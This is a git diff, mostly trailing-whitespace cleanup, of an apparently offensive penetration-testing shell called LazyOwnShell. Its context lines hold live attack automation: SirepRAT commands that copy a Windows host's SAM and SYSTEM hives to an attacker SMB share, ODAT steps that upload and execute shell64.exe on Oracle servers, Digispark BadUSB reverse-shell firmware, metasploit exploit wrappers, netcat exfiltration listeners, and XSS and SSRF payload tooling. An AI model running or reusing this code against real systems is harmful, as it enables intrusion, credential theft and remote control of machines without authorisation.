                 'python3', 'modules_ext/lazyown_infinitestorage/lazyown_infinitestorage.py',
                 '--mode', 'encode',
                 '--input', zip_file_path,
-                '--output', 'sessions/encoded_output.avi',  
-                '--frame_size', '1920', '1080',  
-                '--fps', '25'  
+                '--output', 'sessions/encoded_output.avi',
+                '--frame_size', '1920', '1080',
+                '--fps', '25'
             ]
             print_msg("Codificando en video...")
 
-        
+
         try:
             result = subprocess.run(command, check=True)
             print_msg("Comando ejecutado con éxito: ".join(command))
         except subprocess.CalledProcessError as e:
             print_error(f"Error al ejecutar el comando: {e}")
 
-        
+
         if not line:
-            video_files = [f for f in os.listdir(sessions_dir) if f.endswith(('.mp4', '.mkv', '.avi'))]  
+            video_files = [f for f in os.listdir(sessions_dir) if f.endswith(('.mp4', '.mkv', '.avi'))]
             if not video_files:
                 print_error("No hay videos en la carpeta 'sessions'.")
                 return
@@ -15276,12 +15278,12 @@ class LazyOwnShell(cmd2.Cmd):
             for idx, video in enumerate(video_files, start=1):
                 print_msg(f"{idx}: {video}")
 
-            
+
             choice = input("Elige el número del video que deseas decodificar: ")
             try:
                 choice = int(choice)
                 if 1 <= choice <= len(video_files):
-                    self.do_evidence(video_files[choice - 1])  
+                    self.do_evidence(video_files[choice - 1])
                 else:
                     print_error("Elección no válida.")
             except ValueError:
@@ -15324,7 +15326,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Executed rejetto_hfs_exec exploitation on {rhost} with listener {lhost}.")
         return
 
-    @cmd2.with_category(exploitation_category)    
+    @cmd2.with_category(exploitation_category)
     def do_ms08_067_netapi(self, line):
         """
         SMB CVE-2008-4250. Vulnerable using the module ms08_067_netapi of metasploit
@@ -15428,7 +15430,7 @@ class LazyOwnShell(cmd2.Cmd):
             os.remove(rc_file_path)
 
         print_msg(f"Executed iis_webdav_upload_asp exploitation on {rhost} with listener {lhost}.")
-        return      
+        return
 
     @cmd2.with_category(miscellaneous_category)
     def do_nano(self, line):
@@ -15447,7 +15449,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_warn(f"{users_file_path} does not exist. Creating the file.")
             os.makedirs(os.path.dirname(users_file_path), exist_ok=True)
             with open(users_file_path, 'w') as f:
-                pass 
+                pass
 
         print_msg(f"Opening {users_file_path} with nano for editing.")
         self.cmd(f"nano {users_file_path} -l")
@@ -15502,12 +15504,12 @@ class LazyOwnShell(cmd2.Cmd):
                     command = f"nc -lp {lport} > sessions/{filename}"
                     print_msg(command)
                     self.cmd(command)
-                    
+
                 else:
                     command = f"nc -lp {lport} > sessions/secret.zip"
                     print_msg(command)
                     self.cmd(command)
-                    
+
             else:
                 if int(line) < 1024:
                     print_msg(f"Try.. sudo nc -lvnp {line}{RESET}")
@@ -15568,12 +15570,12 @@ class LazyOwnShell(cmd2.Cmd):
                     command = f"rlwrap  --always-readline nc -lp {lport} > sessions/{filename}"
                     print_msg(command)
                     self.cmd(command)
-                    
+
                 else:
                     command = f"rlwrap  --always-readline nc -lp {lport} > sessions/secret.zip"
                     print_msg(command)
                     self.cmd(command)
-                    
+
             else:
                 if int(line) < 1024:
                     print_msg(f"Try.. sudo rlwrap  --always-readline nc -lvnp {line}{RESET}")
@@ -15584,35 +15586,35 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(
             f"{RED}[*] {YELLOW} Shutdown rlwrap nc sessions in port {RED} [{lport}|{line}] {RESET}"
         )
-        return    
+        return
 
     @cmd2.with_category(reporting_category)
     def do_createjsonmachine(self, line):
         """
         Create a new JSON payload file based on the template provided in payload.json.
 
-        This function reads an existing JSON file named 'payload.json' and 
-        allows the user to update specific fields. The following fields can 
+        This function reads an existing JSON file named 'payload.json' and
+        allows the user to update specific fields. The following fields can
         be modified:
 
-        - 'url': The new URL to connect to, which can be entered manually 
+        - 'url': The new URL to connect to, which can be entered manually
         or automatically generated based on the input parameter 'line'.
-        - 'domain': The new domain associated with the URL, similarly 
+        - 'domain': The new domain associated with the URL, similarly
         generated or entered.
-        - 'rhost': The new remote host IP address that needs to be specified 
+        - 'rhost': The new remote host IP address that needs to be specified
         by the user.
 
-        All other fields from the original payload are preserved in the new 
+        All other fields from the original payload are preserved in the new
         JSON file, ensuring that no other data is lost or altered.
 
-        The newly created JSON payload will be saved in a new file with the 
-        format 'payload_<new_name>.json', where <new_name> is derived 
+        The newly created JSON payload will be saved in a new file with the
+        format 'payload_<new_name>.json', where <new_name> is derived
         from the domain name's subpart.
 
         Parameters:
-        line (str): An optional string parameter that, if provided, is used 
-                    to generate the new 'url' and 'domain'. If empty, 
-                    the user will be prompted to enter values for 'url' 
+        line (str): An optional string parameter that, if provided, is used
+                    to generate the new 'url' and 'domain'. If empty,
+                    the user will be prompted to enter values for 'url'
                     and 'domain'.
 
         Returns:
@@ -15661,26 +15663,26 @@ class LazyOwnShell(cmd2.Cmd):
     @cmd2.with_category(exploitation_category)
     def do_xss(self, line):
         """
-        Executes the XSS (Cross-Site Scripting) vulnerability testing procedure 
+        Executes the XSS (Cross-Site Scripting) vulnerability testing procedure
         using user-defined parameters and configurations.
 
-        This method guides the user through the process of setting up and 
-        executing XSS payload injections against a specified target domain. 
-        It prompts the user for necessary input, including the XSS payload 
-        URL, the target domain, and the request timeout settings. The 
-        function ensures that all required inputs are provided and valid 
+        This method guides the user through the process of setting up and
+        executing XSS payload injections against a specified target domain.
+        It prompts the user for necessary input, including the XSS payload
+        URL, the target domain, and the request timeout settings. The
+        function ensures that all required inputs are provided and valid
         before proceeding with the injection process.
 
         Parameters:
-            line (str): A line of input that may contain additional parameters 
+            line (str): A line of input that may contain additional parameters
                         or commands (not utilized within this method).
 
         Raises:
-            ValueError: If the provided payload URL or target domain is empty, 
-                        indicating that these are required for the injection 
+            ValueError: If the provided payload URL or target domain is empty,
+                        indicating that these are required for the injection
                         process.
 
-        This method leverages user input for flexibility, allowing 
+        This method leverages user input for flexibility, allowing
         customized testing scenarios for XSS vulnerabilities.
         """
         print_msg("Welcome to the Lazy XSS Hunter")
@@ -15722,7 +15724,7 @@ class LazyOwnShell(cmd2.Cmd):
         path = os.getcwd()
         file = f"{path}/sessions/{rhost}_arjun_{domain}.txt"
 
-        command = f"arjun -u {url} -oT {file} -t 20"  
+        command = f"arjun -u {url} -oT {file} -t 20"
         if line and line.startswith("fast"):
             print_msg("Fast Arjun")
         else:
@@ -15764,7 +15766,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Executing command: {command}")
         self.cmd(command)
         return
-    
+
     @cmd2.with_category(credential_access_category)
     def do_transform(self, line):
         """
@@ -15798,8 +15800,8 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Executes the `finger-user-enum` tool for enumerating users on the target host.
 
-        This function checks if the `finger-user-enum` script is available locally; if not, it clones 
-        it from GitHub. It then constructs a command to run the tool with the provided wordlist of 
+        This function checks if the `finger-user-enum` script is available locally; if not, it clones
+        it from GitHub. It then constructs a command to run the tool with the provided wordlist of
         usernames and target host, and executes the command in the system.
 
         Parameters:
@@ -15807,7 +15809,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         Returns:
             None: Outputs the command executed and any messages during execution.
-        """        
+        """
         path = os.getcwd()
         finger = f"{path}/modules_ext/finger-user-enum/finger-user-enum.pl"
         rhost = self.params["rhost"]
@@ -15825,7 +15827,7 @@ class LazyOwnShell(cmd2.Cmd):
             smalldic = f"{path}/modules/credentials.json"
             with open(smalldic, 'r') as f:
                 data = json.load(f)
-            
+
 
             with open('sessions/small_users.txt', 'w') as f:
                 for username in data["usernames"]:
@@ -15838,16 +15840,16 @@ class LazyOwnShell(cmd2.Cmd):
             command = f"{finger} -U {usrwordlist} -t {rhost}"
         print_msg(command)
         self.cmd(command)
-        
+
         return
-    
+
     @cmd2.with_category(command_and_control_category)
     def do_duckyspark(self, line):
         """
         duckyspark Compiles and uploads an .ino sketch to a Digispark device using Arduino CLI and Micronucleus.
 
         duckyspark method checks if Arduino CLI and Micronucleus are installed on the system.
-        If they are not available, it installs them. It then compiles a Digispark sketch 
+        If they are not available, it installs them. It then compiles a Digispark sketch
         and uploads the generated .hex file to the Digispark device.
 
         The method duckyspark performs the following actions:
@@ -15880,7 +15882,7 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd("sudo apt-get install -y micronucleus")
         payload_type = input("    [!] Payload target (1: Windows, 2: Linux, 3: Android): ").strip() or '1'
 
-        if payload_type == '2': 
+        if payload_type == '2':
             self.onecmd("createrevshell")
             lhost = self.params["lhost"]
             if not check_lhost(lhost):
@@ -15926,12 +15928,12 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(compile_command)
             self.cmd(compile_command)
 
-            hex_file_path = f"{path}/sessions/revshell/revshell.ino.hex" 
+            hex_file_path = f"{path}/sessions/revshell/revshell.ino.hex"
             print_msg(f"Uploading the compiled file {hex_file_path} to Digispark...")
             upload_command = f"micronucleus --run {hex_file_path}"
             print_msg(upload_command)
             self.cmd(upload_command)
-           
+
         elif payload_type == '1':
             lhost = self.params["lhost"]
             lport = self.params["lport"]
@@ -15981,7 +15983,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(compile_command)
             self.cmd(compile_command)
 
-            hex_file_path = f"{path}/sessions/winrevshell/winrevshell.ino.hex" 
+            hex_file_path = f"{path}/sessions/winrevshell/winrevshell.ino.hex"
             print_msg(f"Uploading the compiled file {hex_file_path} to Digispark...")
             upload_command = f"micronucleus --run {hex_file_path}"
             print_msg(upload_command)
@@ -15995,8 +15997,8 @@ class LazyOwnShell(cmd2.Cmd):
             if not check_lhost(lhost):
                 return
             ino_file = "digispark_android.ino"
-            
-            
+
+
             path = os.getcwd()
             file = f"{path}/modules/{ino_file}"
             if not is_exist(file):
@@ -16028,31 +16030,31 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(compile_command)
             self.cmd(compile_command)
 
-            hex_file_path = f"{path}/sessions/androidbrowser/androidbrowser.ino.hex" 
+            hex_file_path = f"{path}/sessions/androidbrowser/androidbrowser.ino.hex"
             print_msg(f"Uploading the compiled file {hex_file_path} to Digispark...")
             upload_command = f"micronucleus --run {hex_file_path}"
             print_msg(upload_command)
             self.cmd(upload_command)
-        
+
         else:
             print_error("Invalid payload target.")
-            return    
+            return
         print_msg("Upload completed.")
         if not payload_type == '3':
             self.onecmd("nc")
         return
-    
+
     @cmd2.with_category(credential_access_category)
     def do_username_anarchy(self, line):
         """
         Generate usernames using the username-anarchy tool based on user input.
-        
+
         This function prompts the user to either provide names directly or select
-        options such as auto-generation based on country datasets, input files, and 
-        specific username formats. It then constructs the command for `username-anarchy` 
+        options such as auto-generation based on country datasets, input files, and
+        specific username formats. It then constructs the command for `username-anarchy`
         and executes it.
-        
-        :param line: is optional you can pass the name and lastname as an argument example: username_anarchy firstname lastname 
+
+        :param line: is optional you can pass the name and lastname as an argument example: username_anarchy firstname lastname
         :returns: None
         """
         path = os.getcwd()
@@ -16073,7 +16075,7 @@ class LazyOwnShell(cmd2.Cmd):
             return
 
         auto_generate = input("    [!] Do you want to auto-generate usernames? (y/n): ").strip().lower() or 'n'
-        
+
         if auto_generate == 'y':
             country = input("    [!] Enter the country for auto-generation [argentina, austria, belgium, canada, china, denmark, france, germany, hungary, india, ireland, italy, luxembourg, netherlands, newzealand, norway, poland, serbia, slovenia, spain, sweden, switzerland, uk, us, Facebook] (or leave blank for default): ").strip()
             if country:
@@ -16120,7 +16122,7 @@ class LazyOwnShell(cmd2.Cmd):
                 print_msg("Available username format plugins:")
                 for i, plugin in enumerate(format_plugins):
                     print_msg(f"        {i+1}. {plugin}")
-                
+
                 plugin_choice = input(f"    [!] Choose one or more format plugins (e.g., 1,3,5): ").strip() or '1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'
                 try:
 
@@ -16288,18 +16290,18 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg("Gopherus already cloned, skipping cloning.")
 
         exploits = [
-            "MySQL", 
-            "PostgreSQL", 
-            "FastCGI", 
-            "Redis", 
-            "Zabbix", 
-            "PyMemcache", 
-            "RbMemcache", 
-            "PhpMemcache", 
-            "DmpMemcache", 
+            "MySQL",
+            "PostgreSQL",
+            "FastCGI",
+            "Redis",
+            "Zabbix",
+            "PyMemcache",
+            "RbMemcache",
+            "PhpMemcache",
+            "DmpMemcache",
             "SMTP"
         ]
-        
+
         for i, exploit in enumerate(exploits, 1):
             print_msg(f"{i}. {exploit}")
 
@@ -16374,7 +16376,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         command = f"wpscan --url {url} {stealthy_flag} {enumerate_flag} {api_token_flag}"
         print_msg(f"Running WPScan: {command}")
-        
+
         self.cmd(command)
         return
 
@@ -16384,9 +16386,9 @@ class LazyOwnShell(cmd2.Cmd):
         Create multiple JSON payload files based on a CSV input file from HackerOne.
 
         This function processes a CSV file located in the 'sessions' directory. The CSV file
-        must contain information about different assets, including 'identifier', 
-        'eligible_for_bounty', and 'eligible_for_submission'. For each asset where 
-        both 'eligible_for_bounty' and 'eligible_for_submission' are set to True, 
+        must contain information about different assets, including 'identifier',
+        'eligible_for_bounty', and 'eligible_for_submission'. For each asset where
+        both 'eligible_for_bounty' and 'eligible_for_submission' are set to True,
         a JSON payload file is created using a predefined template.
 
         The CSV must contain the following columns:
@@ -16398,11 +16400,11 @@ class LazyOwnShell(cmd2.Cmd):
         - The URL is generated based on the 'identifier' field.
         - The domain is derived from the 'identifier' field.
         - The 'rhost' field in the JSON payload is updated using the IP address obtained by pinging the domain.
-        
+
         The JSON payload is saved in the format 'payload_<identifier>.json'.
 
         Parameters:
-        line (str): An optional string parameter. If provided, it selects the corresponding CSV file 
+        line (str): An optional string parameter. If provided, it selects the corresponding CSV file
                     in the 'sessions' directory based on the user's input.
 
         Returns:
@@ -16410,7 +16412,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         sessions_dir = 'sessions'
         csv_files = [f for f in os.listdir(sessions_dir) if f.endswith('.csv')]
-        
+
         if not csv_files:
             print_error("No CSV files found in the 'sessions' directory.")
             return
@@ -16418,16 +16420,16 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg("Available CSV files:")
         for idx, file in enumerate(csv_files):
             print_msg(f"{idx}: {file}")
-        
+
         try:
             csv_index = int(input(f"    {GREEN}[!]{CYAN} Select the CSV file number to use: {RESET}"))
             csv_file = csv_files[csv_index]
         except (IndexError, ValueError):
             print_error("Invalid selection.")
             return
-        
+
         csv_path = os.path.join(sessions_dir, csv_file)
-        
+
         try:
             with open(csv_path, mode='r') as file:
                 reader = csv.DictReader(file)
@@ -16470,12 +16472,12 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Convert an IPv4 address into its hexadecimal representation.
 
-        This function takes an IPv4 address in standard dotted-decimal format 
-        (e.g., '192.168.1.1') and converts each of its four octets into a hexadecimal 
-        number. The resulting hexadecimal string is concatenated without separators, 
+        This function takes an IPv4 address in standard dotted-decimal format
+        (e.g., '192.168.1.1') and converts each of its four octets into a hexadecimal
+        number. The resulting hexadecimal string is concatenated without separators,
         providing the full hexadecimal equivalent of the IP address.
 
-        The input IP address is expected to be a string in the format 'X.X.X.X', 
+        The input IP address is expected to be a string in the format 'X.X.X.X',
         where X is an integer between 0 and 255.
 
         Parameters:
@@ -16494,14 +16496,14 @@ class LazyOwnShell(cmd2.Cmd):
     @cmd2.with_category(credential_access_category)
     def do_john2keepas(self, line):
         """
-        List all .kdbx files in the 'sessions' directory, let the user select one, and run the 
-        command `sudo keepass2john {user_file} > sessions/hash.txt`. 
+        List all .kdbx files in the 'sessions' directory, let the user select one, and run the
+        command `sudo keepass2john {user_file} > sessions/hash.txt`.
         If 'sessions/hash.txt' already exists, it will be backed up with a timestamp to avoid overwriting.
-        
+
         Parameters:
-        line (str): An optional string parameter. This can be used for any additional input, 
+        line (str): An optional string parameter. This can be used for any additional input,
                     though it's not needed in this specific command.
-        
+
         Returns:
         None
         """
@@ -16609,13 +16611,13 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Attempts to connect to an MSSQL server using the mssqlclient.py tool with Windows authentication.
 
-        The function retrieves the necessary parameters (remote host and domain) from the 
-        instance's parameter dictionary. If a credentials file exists in the 'sessions_dir', 
-        it reads the file and uses the username/password combinations found there. If the file 
-        does not exist, it prompts the user for a username and password. 
+        The function retrieves the necessary parameters (remote host and domain) from the
+        instance's parameter dictionary. If a credentials file exists in the 'sessions_dir',
+        it reads the file and uses the username/password combinations found there. If the file
+        does not exist, it prompts the user for a username and password.
 
-        The password is copied to the clipboard for convenience. A command is constructed using 
-        the mssqlclient.py tool, and it is then executed to initiate the connection to the MSSQL 
+        The password is copied to the clipboard for convenience. A command is constructed using
+        the mssqlclient.py tool, and it is then executed to initiate the connection to the MSSQL
         server.
 
         Args:
@@ -16662,12 +16664,12 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Executes the GetADUsers.py script to retrieve Active Directory users.
 
-        The function retrieves the necessary parameters (domain controller IP and domain) from the 
-        instance's parameter dictionary. If a credentials file exists in the 'sessions_dir', 
-        it reads the file and uses the username/password combinations found there. If the file 
+        The function retrieves the necessary parameters (domain controller IP and domain) from the
+        instance's parameter dictionary. If a credentials file exists in the 'sessions_dir',
+        it reads the file and uses the username/password combinations found there. If the file
         does not exist, it prompts the user for a username and password.
 
-        The password is copied to the clipboard for convenience. A command is constructed using 
+        The password is copied to the clipboard for convenience. A command is constructed using
         the GetADUsers.py tool, and it is then executed to enumerate Active Directory users.
 
         Args:
@@ -16691,7 +16693,7 @@ class LazyOwnShell(cmd2.Cmd):
             command = f"GetADUsers.py {domain}/{username} -dc-ip {rhost} -debug"
             try:
                 copy2clip(password)
-                
+
                 print_msg(command)
                 self.cmd(command)
                 return
@@ -16700,7 +16702,7 @@ class LazyOwnShell(cmd2.Cmd):
                 print_error(f"Failed to execute GetADUsers: {str(e)}")
 
         else:
-        
+
             txt_files = [f for f in os.listdir(sessions_dir) if f.endswith('.txt')]
 
             if not txt_files:
@@ -16720,7 +16722,7 @@ class LazyOwnShell(cmd2.Cmd):
 
             selected_file_path = os.path.join(sessions_dir, selected_file)
             try:
-        
+
                 with open(selected_file_path, 'r') as file:
                     for line in file:
                         username = line.strip()
@@ -16789,7 +16791,7 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(f"git clone {loxs_url} {loxs_dir}")
             print_msg("Installing requirements...")
             self.cmd(f"cd {loxs_dir} && pip3 install -r requirements.txt")
-            
+
         else:
             print_msg("Loxs already cloned, skipping cloning.")
 
@@ -16833,11 +16835,11 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(f"git clone {blazy_url} {blazy_dir}")
             print_msg("Installing requirements...")
             self.cmd(f"cd {blazy_dir}")
-            
+
         else:
             print_msg("blazy already cloned, skipping cloning.")
 
-        
+
         if not line:
             target = input(f"    {GREEN}[!] Enter the target url (Default: {url}): ") or url
         else:
@@ -17006,7 +17008,7 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             print_msg("XSStrike already cloned, skipping cloning.")
 
-        
+
 
         if not line:
             url = input(f"    {GREEN}[!] Enter the target URL(default {url}): ").strip() or url
@@ -17095,11 +17097,11 @@ class LazyOwnShell(cmd2.Cmd):
             serve_files = False
             file_server_port = "8000"
             file_server_password = ""
-            
+
             i_flag = False
             c_flag = False
             s_flag = False
-            
+
             for i in range(1, len(args)):
                 if args[i] == '-i':
                     i_flag = True
@@ -17110,7 +17112,7 @@ class LazyOwnShell(cmd2.Cmd):
                 if args[i] == '-s':
                     s_flag = True
                     continue
-                
+
                 if i_flag:
                     interface = args[i]
                     i_flag = False
@@ -17128,7 +17130,7 @@ class LazyOwnShell(cmd2.Cmd):
                     maintain_shells = args[i+1]
                 elif args[i] == '-pass':
                     file_server_password = args[i+1]
-            
+
         command = f"python3 {penelope_dir}/penelope.py {port}"
         if interface:
             command += f" -i {interface}"
@@ -17146,7 +17148,7 @@ class LazyOwnShell(cmd2.Cmd):
                 command += f" -p {file_server_port}"
             if file_server_password:
                 command += f" -pass {file_server_password}"
-        
+
         print_msg(f"Running Penelope with command: {command}")
         self.cmd(command)
         return
@@ -17183,7 +17185,7 @@ class LazyOwnShell(cmd2.Cmd):
             - The method assumes that the session name is defined and accessible in
             the scope where this method is called.
         """
-        ensure_tmux_session(session_name) 
+        ensure_tmux_session(session_name)
         size = 50
         print_msg(f"Open new Windows: {size}")
         command = f"tmux split-window -v -t {session_name} -p {size} \"bash -c './run --no-banner' C-m\""
@@ -17222,8 +17224,8 @@ class LazyOwnShell(cmd2.Cmd):
             - The method assumes that the session name is defined and accessible in
             the scope where this method is called.
         """
-        ensure_tmux_session(session_name) 
-        size = 50  
+        ensure_tmux_session(session_name)
+        size = 50
         print_msg(f"Open new Windows: {size}")
         command = f"tmux split-window -h -t {session_name} -p {size} \"bash -c './run --no-banner' C-m\""
         print_msg(command)
@@ -17248,7 +17250,7 @@ class LazyOwnShell(cmd2.Cmd):
         Example:
             adgetpass MONTEVERDE ADSync 1 1852B527-DD4F-4ECF-B541-EFCCBFF29E31 194EC2FC-F186-46CF-B44D-071EB61F49CD
         """
-        
+
         args = line.split() if line else []
         subdomain = self.params["subdomain"]
         server = args[0] if len(args) > 0 else input(f"    [!] Enter the SQL Server (default '{subdomain}'): ").strip() or subdomain
@@ -17339,7 +17341,7 @@ class LazyOwnShell(cmd2.Cmd):
             payloads_file = input(f"    [?] Enter the path to the payloads file (default: {file_payloads}): ").strip() or file_payloads
             keyword = input("    [?] Enter the keyword to replace in URLs (default 'FUZZ'): ").strip() or "FUZZ"
             concurrency = input("    [?] Enter the concurrency level (default 100): ").strip() or "100"
-            
+
         else:
             args = line.split()
             urls_file = args[0] if len(args) > 0 else ""
@@ -17350,7 +17352,7 @@ class LazyOwnShell(cmd2.Cmd):
         if not urls_file:
             print_warn("No URL file provided, aborting scan.")
             return
-        
+
         payloads_option = f"-p {payloads_file}" if payloads_file else ""
         command = f"cat {urls_file} | python3 {openredirex_dir}/openredirex.py {payloads_option} -k {keyword} -c {concurrency}"
 
@@ -17380,11 +17382,11 @@ class LazyOwnShell(cmd2.Cmd):
         url = self.params["url"]
         wordlist = self.params["wordlist"]
         path = os.getcwd()
-        
+
         exploit_dir = os.path.join(path, "external/.exploit")
         feroxbuster_url = "https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh"
         feroxbuster_bin = os.path.join(os.getenv("HOME"), ".local/bin/feroxbuster")
-        
+
         os.makedirs(exploit_dir, exist_ok=True)
 
         if not os.path.exists(feroxbuster_bin):
@@ -17400,7 +17402,7 @@ class LazyOwnShell(cmd2.Cmd):
             headers = input("    [?] Enter additional headers (optional): ").strip()
             recursion = input("    [?] Enable recursion? (y/n, default 'y'): ").strip().lower() or 'y'
             verbosity = input("    [?] Verbosity level (1-3, default '1'): ").strip() or "1"
-        
+
         else:
             args = line.split()
             url = args[0] if len(args) > 0 else ""
@@ -17419,7 +17421,7 @@ class LazyOwnShell(cmd2.Cmd):
         headers_option = f"-H {headers}" if headers else ""
         recursion_option = "--no-recursion" if recursion == 'n' else ""
         verbosity_option = f"-{'v' * int(verbosity)}"
-        
+
 
         command = f"{feroxbuster_bin} -u {url} {wordlist_option} {extensions_option} {headers_option} {recursion_option} {verbosity_option}"
 
@@ -17460,7 +17462,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg("Gowitness already installed, skipping installation.")
 
         gowitness_command = f"{gowitness_path} report server --screenshot-path {sessions}/img/{rhost}_screenshots"
-        
+
         print_msg(f"Running Gowitness scan: {gowitness_command}")
         self.cmd(gowitness_command)
 
@@ -17491,7 +17493,7 @@ class LazyOwnShell(cmd2.Cmd):
         sessions_dir = os.path.join(path, "sessions")
         file_gz = "odat-linux-libc2.17-x86_64.tar.gz"
         odat_url = f"https://github.com/quentinhardy/odat/releases/download/5.1.1/odat-linux-libc2.17-x86_64.tar.gz"
-        odat_dir = os.path.join(exploit_dir, "odat")        
+        odat_dir = os.path.join(exploit_dir, "odat")
         odat_path = f"{odat_dir}/odat-libc2.17-x86_64/odat-libc2.17-x86_64"
         if not os.path.exists(odat_path):
             print_msg("Download from ODAT repository...")
@@ -17505,9 +17507,9 @@ class LazyOwnShell(cmd2.Cmd):
 
         rhost = input(f"    {GREEN}[!] Enter the target RHOST (default {rhost}): ").strip() or rhost
         port = input(f"    [?] Enter the target port (default 1521): ").strip() or "1521"
-        
+
         if not line:
-            list_attacks = ["sidguesser", "passwordguesser", "utlfile", "externaltable"]        
+            list_attacks = ["sidguesser", "passwordguesser", "utlfile", "externaltable"]
             print_msg("Select an attack: ")
             for i, attack in enumerate(list_attacks, 1):
                 print_warn(f"{i}. {attack}")
@@ -17524,20 +17526,20 @@ class LazyOwnShell(cmd2.Cmd):
             return
 
         if line.startswith("sidguesser"):
-        
+
             odat_command = f"cd {odat_dir}/odat-libc2.17-x86_64 && {odat_path} sidguesser -s {rhost} -p {port}"
             print_msg(f"Running ODAT SID guessing on {rhost}:{port}... {odat_command}")
 
             self.cmd(odat_command)
 
-        elif line.startswith("passwordguesser"): 
+        elif line.startswith("passwordguesser"):
             SID = input("    [!] Enter valid SID: ")
             odat_command = f"cd {odat_dir}/odat-libc2.17-x86_64 && {odat_path} passwordguesser -s {rhost} -p {port} -d {SID} --accounts-file accounts/accounts.txt"
             print_msg(f"Running ODAT SID guessing on {rhost}:{port}... {odat_command}")
 
             self.cmd(odat_command)
-    
-        elif line.startswith("utlfile"): 
+
+        elif line.startswith("utlfile"):
             if os.path.exists(os.path.join(sessions_dir, 'shell64.exe')):
                 if os.path.exists(os.path.join(sessions_dir, 'credentials.txt')):
                     credentials = get_credentials()
@@ -17546,7 +17548,7 @@ class LazyOwnShell(cmd2.Cmd):
 
                     for user, passwd in credentials:
                         password = passwd
-                        username = user      
+                        username = user
                     SID = input("    [!] Enter valid SID: ")
                     odat_command = f"cd {sessions_dir} && {odat_path} utlfile -s {rhost} -p {port} -U {username} -P {password} -d {SID} --sysdba --putFile /temp shell64.exe shell64.exe"
                     print_msg(f"Running ODAT SID guessing on {rhost}:{port}... {odat_command}")
@@ -17556,8 +17558,8 @@ class LazyOwnShell(cmd2.Cmd):
                     print_error(f"Credentials must be assign, use: {GREEN}createcredentials admin:admin")
             else:
                 print_error(f"Shell64.exe not found, use: {GREEN}venom")
-        
-        elif line.startswith("externaltable"): 
+
+        elif line.startswith("externaltable"):
 
             if os.path.exists(os.path.join(sessions_dir, 'credentials.txt')):
                 credentials = get_credentials()
@@ -17566,7 +17568,7 @@ class LazyOwnShell(cmd2.Cmd):
 
                 for user, passwd in credentials:
                     password = passwd
-                    username = user      
+                    username = user
                 SID = input("    [!] Enter valid SID: ")
                 odat_command = f"{odat_path} externaltable -s {rhost} -p {port} -U {username} -P {password} -d {SID} --sysdba --exec /temp shell64.exe"
                 print_msg(f"Running ODAT SID guessing on {rhost}:{port}... {odat_command}")
@@ -17610,7 +17612,7 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(f"pip3 install -r {sireprat_dir}/requirements.txt")
         else:
             print_msg("SirepRAT already installed, skipping setup.")
-        
+
         choice = input("    [!] do you wanna config smb service ? its necesary to perform the attack. (y/n): ") or 'n'
         if choice == "y":
             smb_file = "/etc/samba/smb.conf"
@@ -17642,13 +17644,13 @@ class LazyOwnShell(cmd2.Cmd):
             f"LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c copy C:\\SYSTEM \\\\\\\\{lhost}\\\\Public\\\\SYSTEM\"",
             f"LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c copy C:\\SAM \\\\\\\\{lhost}\\\\Public\\\\SAM\""
         ]
-        
+
         if not line:
             print_msg("Select an attack:")
             print_warn("0. all")
             for i, attack in enumerate(attack_list, 1):
                 print_warn(f"{i}. {attack}")
-            
+
             try:
                 selected_attack = int(input(f"    [!] Enter your choice (0-{len(attack_list)}): "))
                 if selected_attack == 0:
@@ -17659,7 +17661,7 @@ class LazyOwnShell(cmd2.Cmd):
                         self.cmd(sireprat_command)
                         print_msg(f"Sleeping 1 sec to continue to the next attack...")
                         time.sleep(1)
-                    print_msg(f"cp /tmp/Public/* {sessions}")    
+                    print_msg(f"cp /tmp/Public/* {sessions}")
                     self.cmd(f"cp /tmp/Public/* {sessions}")
 
                 elif 1 <= selected_attack <= len(attack_list):
@@ -17671,7 +17673,7 @@ class LazyOwnShell(cmd2.Cmd):
                 print_error("Enter a valid option.")
                 return
             sireprat_command = f"python3 {sireprat_dir}/SirepRAT.py {rhost} {line}"
-        
+
         elif line == "all":
             print_msg("Executing all attacks sequentially...")
             for attack in attack_list:
@@ -17680,13 +17682,13 @@ class LazyOwnShell(cmd2.Cmd):
                 self.cmd(sireprat_command)
                 print_msg(f"Sleeping 1 sec to continue to the next attack...")
                 time.sleep(1)
-            print_msg(f"cp /tmp/Public/* {sessions}")    
-            self.cmd(f"cp /tmp/Public/* {sessions}")                
+            print_msg(f"cp /tmp/Public/* {sessions}")
+            self.cmd(f"cp /tmp/Public/* {sessions}")
             return
-        
+
         else:
             sireprat_command = f"python3 {sireprat_dir}/SirepRAT.py {rhost} LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c {line}\""
-        
+
         print_msg(f"Running SirepRAT attack: {sireprat_command}")
         self.cmd(sireprat_command)
         return
@@ -17708,7 +17710,7 @@ class LazyOwnShell(cmd2.Cmd):
         Returns:
         None
         """
-        
+
         json_files = glob.glob("payload_*.json")
 
         hosts = []
@@ -17733,7 +17735,7 @@ class LazyOwnShell(cmd2.Cmd):
                     targets.append(f"{cleaned_url}")
                     targets.append(f"{subdomain}.{domain}")
                     targets.append(f"{subdomain}.{cleaned_url}")
-            
+
